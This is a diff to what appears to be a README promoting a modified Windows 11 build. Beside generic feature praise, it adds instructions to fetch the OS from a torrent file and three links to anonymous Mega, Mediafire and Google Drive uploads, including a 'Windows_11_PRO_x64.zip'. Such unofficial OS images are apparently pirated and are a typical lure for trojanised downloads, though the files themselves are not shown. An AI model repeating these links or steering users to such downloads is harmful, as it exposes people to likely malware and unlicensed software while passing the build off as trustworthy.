@@ -6,6 +6,11 @@ One of the standout features of this particular build of Windows 11 is the remov
 
 In addition to this, Windows 11 boasts improved performance, enhanced gaming capabilities, and better support for touch and pen inputs, making it ideal for a wide range of devices—from traditional PCs to tablets. With a focus on productivity and creativity, Windows 11 empowers users to do more with its innovative features, all while ensuring a smooth and enjoyable experience. Whether you're upgrading from a previous version or installing for the first time, this build of Windows 11 offers a user-friendly and accessible approach to modern computing.
 
+You can download Windows 11 from torrent file. The file is located above in the file list. After selecting the file, click on "View raw" and the torrent file will be downloaded.
+<a href="https://mega.nz/file/nthFkaaa#HuPVm3moZb5RHT1uLp43uA98BHrZ2fz0LeGl7BjT7mo">Download Windows 11 from Mega</a>
+<a href="https://www.mediafire.com/file/2b6d4oqjd9js32e/Windows_11_PRO_x64.zip/file">Download Windows 11 from Mediafire</a>
+<a href="https://drive.google.com/file/d/1F_gtH6L9ibNawERv5uJ2Mzo4e7XPTpf2/view">Download Windows 11 from Google Drive</a>
+
 Minimum System Requirements for Windows 11
 
     Processor:
